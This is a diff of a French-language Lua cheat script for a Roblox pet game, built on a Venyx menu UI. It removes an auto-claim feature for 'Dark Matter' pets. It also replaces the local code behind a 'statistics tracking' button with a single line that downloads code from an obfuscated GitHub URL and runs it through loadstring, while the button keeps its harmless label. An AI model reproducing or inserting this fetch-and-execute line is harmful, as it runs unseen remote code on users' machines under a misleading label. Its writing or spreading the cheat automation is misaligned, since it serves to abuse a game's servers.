@@ -151,12 +151,6 @@ local misc2 = page:addSection("Ouvrir des Menus.")
 -- section oeufs
 local page = venyx:addPage("Oeufs", 5094819983)
 local eggs1 = page:addSection("Ouvre-oeufs automatisée")
--------------------------------------------------------------------------------------------------
-
--- section pets
-local page = venyx:addPage("Animaux", 329532393)
---local pets3 = page:addSection("Automated enchant | Temporarily disabled.")
-local pets4 = page:addSection("Dark Matter")
 
 -------------------------------------------------------------------------------------------------
 
@@ -754,49 +748,7 @@ for i,v in pairs(GameLibrary.Directory.Pets) do
 end
 
 -------------------------------------------------------------------------------------------------
---Dark Matter
 
-pets4:addButton("Vérification du temps restant", function()
-        local PetList = {}
-        for i,v in pairs(GameLibrary.Directory.Pets) do
-        PetList[i] = v.name
-        end
-
-        local returnstring = ""
-        for i,v in pairs(GameLibrary.Save.Get().DarkMatterQueue) do
-            local timeleft = 'Prêt.'
-            if math.floor(v.readyTime - os.time()) > 0 then
-                timeleft = SecondsToClock(math.floor(v.readyTime - os.time()))
-            end
-            local stringthing = PetList[v.petId] .." va être prêt dans: ".. timeleft
-            returnstring = returnstring .. stringthing .. "\n"
-        end
-        require(game:GetService("ReplicatedStorage").Framework.Modules.Client["5 | Message"]).New(returnstring)
-end)
-
--------------------------------
-pets4:addToggle("Activer l'auto-claim automatisé des Dark Matter", false, function(autoclaimdark)
-
-if autoclaimdark == true then
-    _G.AutoClaimDarkMatter = true
-elseif autoclaimdark == false then
-    _G.AutoClaimDarkMatter = false
-end
-    
-spawn(function()
-    while task.wait() and _G.AutoClaimDarkMatter do
-        for i,v in pairs(GameLibrary.Save.Get().DarkMatterQueue) do
-            if math.floor(v.readyTime - os.time()) < 0 then
-                workspace.__THINGS.__REMOTES["redeem dark matter pet"]:InvokeServer({[1] = i})
-            end
-            end
-        task.wait(15)
-    end
-end)
-end)
-
-
--------------------------------------------------------------------------------------------------
 --page3
 
 
@@ -831,71 +783,7 @@ end
 end)
 
 section2:addButton("Suivi des statistiques", function()
-    local gamelibrary = require(game:GetService("ReplicatedStorage").Framework.Library)
-local Save = gamelibrary.Save.Get
-local Commas = gamelibrary.Functions.Commas
-local types = {}
-local menus = game:GetService("Players").LocalPlayer.PlayerGui.Main.Right
-for i, v in pairs(menus:GetChildren()) do
-    if v.ClassName == 'Frame' and v.Name ~= 'Rank' and not string.find(v.Name, "2") then
-        table.insert(types, v.Name)
-    end
-end
-
-function get(thistype)
-    return Save()[thistype]
-end
-
-menus.Diamonds.LayoutOrder = 99988
-menus['Tech Coins'].LayoutOrder = 99992
-menus['Fantasy Coins'].LayoutOrder = 99994
-menus.Coins.LayoutOrder = 99996
-menus.UIListLayout.HorizontalAlignment = 2
-
-_G.MyTypes = {}
-for i,v in pairs(types) do
-    if menus:FindFirstChild(v.."2") then
-        menus:FindFirstChild(v.."2"):Destroy()
-    end
-end
-for i,v in pairs(types) do
-    if not menus:FindFirstChild(v.."2") then
-        local tempmaker = menus:FindFirstChild(v):Clone()
-        tempmaker.Name = tostring(tempmaker.Name .. "2")
-        tempmaker.Parent = menus
-        tempmaker.Size = UDim2.new(0, 175, 0, 30)
-        tempmaker.LayoutOrder = tempmaker.LayoutOrder + 1
-        _G.MyTypes[v] = tempmaker
-    end
-end
-menus.Diamonds2.Add.Visible = false
-
--- Skidded from byte-chan:tm:
-for i,v in pairs(types) do
-    spawn(function()
-        local megatable = {}
-        local imaginaryi = 1
-        local ptime = 0
-        local last = tick()
-        local now = last
-        local TICK_TIME = 0.5
-        while true do
-            if ptime >= TICK_TIME then
-                while ptime >= TICK_TIME do ptime = ptime - TICK_TIME end
-                local currentbal = get(v)
-                megatable[imaginaryi] = currentbal
-                local diffy = currentbal - (megatable[imaginaryi-120] or megatable[1])
-                imaginaryi = imaginaryi + 1
-                _G.MyTypes[v].Amount.Text = tostring(Commas(diffy).." in 60s")
-                _G.MyTypes[v]["Amount_odometerGUIFX"].Text = tostring(Commas(diffy).." in 60s")
-            end
-            task.wait(0.001)
-            now = tick()
-            ptime = ptime + (now - last)
-            last = now
-        end
-    end)
-end
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Homsat21/623wgy777qsad/main/St4t1st1kM3Nk0Ol'))()
     print("Suivi des statistiques activé.")
 end)
 
